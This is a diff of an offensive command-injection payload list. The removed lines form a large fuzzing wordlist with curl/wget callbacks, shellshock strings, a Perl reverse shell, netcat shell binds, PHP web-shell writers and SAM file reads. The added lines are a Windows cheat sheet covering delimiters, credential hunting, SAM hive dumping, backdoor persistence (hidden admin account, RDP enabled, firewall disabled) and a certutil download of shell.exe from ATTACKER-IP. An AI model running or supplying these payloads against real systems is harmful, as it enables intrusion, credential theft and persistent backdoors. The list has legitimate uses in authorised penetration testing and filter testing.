@@ -1,435 +1,87 @@
-`
-|| 
-| 
-; 
-'
-'"
-"
-"'
-& 
-&& 
-%0a
-%0a%0d
+# WINDOWS OS COMMAND INJECTION - 2026 edition
+# Replace ATTACKER-IP with your listener IP. cmd.exe is default; many modern apps shell out to
+# PowerShell or cmd /c. Bash-only tricks do NOT apply here - see Linux file for those.
 
-%0Aid
-%0a id %0a
-%0Aid%0A
-!whoami!
-%whoami%
-!%whoami
-%!whoami
-%!whoami!%
-!%whoami%!
-%0a ping -i 30 127.0.0.1 %0a
-%0A/usr/bin/id
-%0A/usr/bin/id%0A
-%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
-%20{${phpinfo()}}
-%20{${sleep(20)}}
-%20{${sleep(3)}}
-a|id|
-a;id|
-a;id;
-a;id\n
-() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12
-| curl http://crowdshield.com/.testing/rce.txt
-& curl http://crowdshield.com/.testing/rce.txt
-; curl https://crowdshield.com/.testing/rce_vuln.txt
-&& curl https://crowdshield.com/.testing/rce_vuln.txt
-curl https://crowdshield.com/.testing/rce_vuln.txt
- curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
-curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\" |curl https://crowdshield.com/.testing/rce_vuln.txt
-$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
-dir
-| dir
-; dir
-$(`dir`)
-& dir
-&&dir
-&& dir
-| dir C:\
-; dir C:\
-& dir C:\
-&& dir C:\
-dir C:\
-| dir C:\Documents and Settings\*
-; dir C:\Documents and Settings\*
-& dir C:\Documents and Settings\*
-&& dir C:\Documents and Settings\*
-dir C:\Documents and Settings\*
-| dir C:\Users
-; dir C:\Users
-& dir C:\Users
-&& dir C:\Users
-dir C:\Users
-;echo%20'<script>alert(1)</script>'
-echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
-| echo "<?php include($_GET['page'])| ?>" > rfi.php
-; echo "<?php include($_GET['page']); ?>" > rfi.php
-& echo "<?php include($_GET['page']); ?>" > rfi.php
-&& echo "<?php include($_GET['page']); ?>" > rfi.php
-echo "<?php include($_GET['page']); ?>" > rfi.php
-| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
-; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
-& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
-&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
-echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
-| echo "<?php system($_GET['cmd'])| ?>" > cmd.php
-; echo "<?php system($_GET['cmd']); ?>" > cmd.php
-& echo "<?php system($_GET['cmd']); ?>" > cmd.php
-&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
-echo "<?php system($_GET['cmd']); ?>" > cmd.php
-;echo '<script>alert(1)</script>'
-echo '<script>alert(1)</script>'// XXXXXXXXXXX
-echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX
-| echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
-; echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
-& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
-&& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
-echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
-() { :;}; echo vulnerable 10
-eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
-eval('ls')
-eval('pwd')
-eval('pwd');
-eval('sleep 5')
-eval('sleep 5');
-eval('whoami')
-eval('whoami');
-exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
-exec('ls')
-exec('pwd')
-exec('pwd');
-exec('sleep 5')
-exec('sleep 5');
-exec('whoami')
-exec('whoami');
-;{$_GET["cmd"]}
-`id`
-|id
-| id
-;id
-;id|
-;id;
-& id
-&&id
-;id\n
-ifconfig
-| ifconfig
-; ifconfig
-& ifconfig
-&& ifconfig
-/index.html|id|
-ipconfig
-| ipconfig /all
-; ipconfig /all
-& ipconfig /all
-&& ipconfig /all
-ipconfig /all
-ls
-$(`ls`)
-| ls -l /
-; ls -l /
-& ls -l /
-&& ls -l /
-ls -l /
-| ls -laR /etc
-; ls -laR /etc
-& ls -laR /etc
-&& ls -laR /etc
-| ls -laR /var/www
-; ls -laR /var/www
-& ls -laR /var/www
-&& ls -laR /var/www
-| ls -l /etc/
-; ls -l /etc/
-& ls -l /etc/
-&& ls -l /etc/
-ls -l /etc/
-ls -lh /etc/
-| ls -l /home/*
-; ls -l /home/*
-& ls -l /home/*
-&& ls -l /home/*
-ls -l /home/*
-*; ls -lhtR /var/www/
-| ls -l /tmp
-; ls -l /tmp
-& ls -l /tmp
-&& ls -l /tmp
-ls -l /tmp
-| ls -l /var/www/*
-; ls -l /var/www/*
-& ls -l /var/www/*
-&& ls -l /var/www/*
-ls -l /var/www/*
-\n
-\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
-\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
-\n/bin/ls -al\n
-| nc -lvvp 4444 -e /bin/sh|
-; nc -lvvp 4444 -e /bin/sh;
-& nc -lvvp 4444 -e /bin/sh&
-&& nc -lvvp 4444 -e /bin/sh &
-nc -lvvp 4444 -e /bin/sh
-nc -lvvp 4445 -e /bin/sh &
-nc -lvvp 4446 -e /bin/sh|
-nc -lvvp 4447 -e /bin/sh;
-nc -lvvp 4448 -e /bin/sh&
-\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
-\necho INJECTX\nexit\n\033[2Asleep 5\n
-\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
-| net localgroup Administrators hacker /ADD
-; net localgroup Administrators hacker /ADD
-& net localgroup Administrators hacker /ADD
-&& net localgroup Administrators hacker /ADD
-net localgroup Administrators hacker /ADD
-| netsh firewall set opmode disable
-; netsh firewall set opmode disable
-& netsh firewall set opmode disable
-&& netsh firewall set opmode disable
-netsh firewall set opmode disable
-netstat
-;netstat -a;
-| netstat -an
-; netstat -an
-& netstat -an
-&& netstat -an
-netstat -an
-| net user hacker Password1 /ADD
-; net user hacker Password1 /ADD
-& net user hacker Password1 /ADD
-&& net user hacker Password1 /ADD
-net user hacker Password1 /ADD
-| net view
-; net view
-& net view
-&& net view
-net view
-\nid|
-\nid;
-\nid\n
-\n/usr/bin/id\n
-perl -e 'print "X"x1024'
-|| perl -e 'print "X"x16096'
-| perl -e 'print "X"x16096'
-; perl -e 'print "X"x16096'
-& perl -e 'print "X"x16096'
-&& perl -e 'print "X"x16096'
-perl -e 'print "X"x16384'
-; perl -e 'print "X"x2048'
-& perl -e 'print "X"x2048'
-&& perl -e 'print "X"x2048'
-perl -e 'print "X"x2048'
-|| perl -e 'print "X"x4096'
-| perl -e 'print "X"x4096'
-; perl -e 'print "X"x4096'
-& perl -e 'print "X"x4096'
-&& perl -e 'print "X"x4096'
-perl -e 'print "X"x4096'
-|| perl -e 'print "X"x8096'
-| perl -e 'print "X"x8096'
-; perl -e 'print "X"x8096'
-&& perl -e 'print "X"x8096'
-perl -e 'print "X"x8192'
-perl -e 'print "X"x81920'
-|| phpinfo()
-| phpinfo()
- {${phpinfo()}}
-;phpinfo()
-;phpinfo();//
-';phpinfo();//
-{${phpinfo()}}
-& phpinfo()
-&& phpinfo()
-phpinfo()
-phpinfo();
-<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
-<?php system("curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj");?>
-<?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>
-<?php system("sleep 10");?>
-<?php system("sleep 5");?>
-<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
-<?php system("wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc");?>
-:phpversion();
-`ping 127.0.0.1`
-& ping -i 30 127.0.0.1 &
-& ping -n 30 127.0.0.1 &
-;${@print(md5(RCEVulnerable))};
-${@print("RCEVulnerable")}
-${@print(system($_SERVER['HTTP_USER_AGENT']))}
-pwd
-| pwd
-; pwd
-& pwd
-&& pwd
-\r
-| reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-&& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-\r\n
-route
-| sleep 1
-; sleep 1
-& sleep 1
-&& sleep 1
-sleep 1
-|| sleep 10
-| sleep 10
-; sleep 10
-{${sleep(10)}}
-& sleep 10 
-&& sleep 10
-sleep 10
-|| sleep 15
-| sleep 15
-; sleep 15
-& sleep 15 
-&& sleep 15
- {${sleep(20)}}
-{${sleep(20)}}
- {${sleep(3)}}
-{${sleep(3)}}
-| sleep 5
-; sleep 5
-& sleep 5
-&& sleep 5
-sleep 5
- {${sleep(hexdec(dechex(20)))}} 
-{${sleep(hexdec(dechex(20)))}} 
-sysinfo
-| sysinfo
-; sysinfo
-& sysinfo
-&& sysinfo
-system('cat C:\boot.ini');
-system('cat config.php');
-|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
-| system('curl https://crowdshield.com/.testing/rce_vuln.txt');
-; system('curl https://crowdshield.com/.testing/rce_vuln.txt');
-& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
-&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');
-system('curl https://crowdshield.com/.testing/rce_vuln.txt')
-system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')
-system('curl https://xerosecurity.com/.testing/rce_vuln.txt');
-system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
-systeminfo
-| systeminfo
-; systeminfo
-& systeminfo
-&& systeminfo
-system('ls')
-system('pwd')
-system('pwd');
-|| system('sleep 5');
-| system('sleep 5');
-; system('sleep 5');
-& system('sleep 5');
-&& system('sleep 5');
-system('sleep 5')
-system('sleep 5');
-system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')
-system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
-system('whoami')
-system('whoami');
-test*; ls -lhtR /var/www/
-test* || perl -e 'print "X"x16096'
-test* | perl -e 'print "X"x16096'
-test* & perl -e 'print "X"x16096'
-test* && perl -e 'print "X"x16096'
-test*; perl -e 'print "X"x16096'
-$(`type C:\boot.ini`)
-&&type C:\\boot.ini
-| type C:\Windows\repair\SAM
-; type C:\Windows\repair\SAM
-& type C:\Windows\repair\SAM
-&& type C:\Windows\repair\SAM
-type C:\Windows\repair\SAM
-| type C:\Windows\repair\SYSTEM
-; type C:\Windows\repair\SYSTEM
-& type C:\Windows\repair\SYSTEM
-&& type C:\Windows\repair\SYSTEM
-type C:\Windows\repair\SYSTEM
-| type C:\WINNT\repair\SAM
-; type C:\WINNT\repair\SAM
-& type C:\WINNT\repair\SAM
-&& type C:\WINNT\repair\SAM
-type C:\WINNT\repair\SAM
-type C:\WINNT\repair\SYSTEM
-| type %SYSTEMROOT%\repair\SAM
-; type %SYSTEMROOT%\repair\SAM
-& type %SYSTEMROOT%\repair\SAM
-&& type %SYSTEMROOT%\repair\SAM
-type %SYSTEMROOT%\repair\SAM
-| type %SYSTEMROOT%\repair\SYSTEM
-; type %SYSTEMROOT%\repair\SYSTEM
-& type %SYSTEMROOT%\repair\SYSTEM
-&& type %SYSTEMROOT%\repair\SYSTEM
-type %SYSTEMROOT%\repair\SYSTEM
-uname
-;uname;
-| uname -a
-; uname -a
-& uname -a
-&& uname -a
-uname -a
-|/usr/bin/id
-;|/usr/bin/id|
-;/usr/bin/id|
-$;/usr/bin/id
-() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\");'
-() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11
-| wget http://crowdshield.com/.testing/rce.txt
-& wget http://crowdshield.com/.testing/rce.txt
-; wget https://crowdshield.com/.testing/rce_vuln.txt
-$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
-&& wget https://crowdshield.com/.testing/rce_vuln.txt
-wget https://crowdshield.com/.testing/rce_vuln.txt
-$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
-which curl
-which gcc
-which nc
-which netcat
-which perl
-which python
-which wget
+## 1) DELIMITERS / FUZZERS
+;  |  &  &&  ||  %0a  %0a%0d  \n  \r  cmd&  |&  ||&  1|whoami 1;whoami
+%whoami%  !whoami!  %!whoami!%   # environment/expansion style
+"whoami"  'whoami'  "|whoami"    # quote confusion
+` whoami `                         # PowerShell else backtick escape in cmd = literal!
+whoami^&whoami                     # caret escapes metachar (cmd parser)
+
+## 2) DETECTION BASELINE
 whoami
-| whoami
-; whoami
-' whoami
-' || whoami
-' & whoami
-' && whoami
-'; whoami
-" whoami
-" || whoami
-" | whoami
-" & whoami
-" && whoami
-"; whoami
-$(`whoami`)
-& whoami
-&& whoami
-{{ get_user_file("C:\boot.ini") }}
-{{ get_user_file("/etc/hosts") }}
-{{4+4}}
-{{4+8}}
-{{person.secret}}
-{{person.name}}
-{1} + {1}
-{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
-{{[] .__ Class __.__ base __.__ subclasses __ ()}}
-somedir \x1a whoami
-\! whoami
-word " c:\\where\\ || dir || '
-{{ get_user_file("C:\boot.ini") }}
-{{ get_user_file("/etc/hosts") }}
-{{4+4}}
-{{4+8}}
-{{person.secret}}
-{{person.name}}
-{1} + {1}
-{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
-{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+whoami /all            # privileges + group membership
+hostname
+ver
+echo %USERDOMAIN%\%USERNAME%
+ipconfig /all
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+;whoami;       |whoami|       ||whoami||      &whoami
+1 & whoami    1 && whoami    1 | whoami
+' & whoami    ' && whoami    " || whoami    "; whoami
+# Timing canaries (blind)
+ping -n 21 127.0.0.1
+timeout /t 5 /nobreak
+powershell -c Start-Sleep -s 5
+x||ping+-n+21+127.0.0.1||
+# DNS callback to Collaborator
+nslookup ATTACKER-IP
+ping -n 1 ATTACKER-IP
+
+## 3) READ FILES / CREDENTIAL HUNTS
+type C:\Windows\repair\SAM
+type C:\Windows\repair\SYSTEM
+type C:\Windows\repair\SAM         # Win7-era repair hives
+type %SYSTEMROOT%\repair\SAM
+type C:\boot.ini
+type C:\Windows\win.ini
+type C:\inetpub\wwwroot\web.config
+type C:\inetpub\wwwroot\appsettings.json
+dir /s /b C:\*.txt C:\*.config C:\*.log C:\*.bak 2>nul
+findstr /si "password" C:\*.config C:\*.ini 2>nul
+powershell -c Get-ChildItem C:\Users -Recurse -Include *.txt,*.config,*.log -ErrorAction SilentlyContinue | Select-String -Pattern "password"
+# SAM dump if SYSKEY layered:
+reg save HKLM\SAM sam.hiv
+reg save HKLM\SYSTEM sys.hiv
+reg save HKLM\SECURITY sec.hiv
+
+## 4) PERSISTENCE / BACKDOOR (only on targets you own)
+net user hacker P@ssw0rd! /add
+net localgroup Administrators hacker /add
+net localgroup "Remote Desktop Users" hacker /add
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh firewall set opmode disable
+schtasks /create /sc onlogon /tn svc /tr "cmd /c whoami > C:\p.txt"
+# with injection shape in front:  | net user ...  ; net localgroup ...  & reg add ...
+
+## 5) NETWORK / HOST
+ipconfig /all
+netstat -an
+net view
+net use
+route print
+arp -a
+powershell -c "Get-NetTCPConnection"
+tasklist /svc
+wmic process list brief
+whoami /priv
+
+## 6) DOWNLOAD + EXEC (bypass execution policy further in WAF file)
+certutil -urlcache -split -f http://ATTACKER-IP/shell.exe C:\Windows\Temp\s.exe
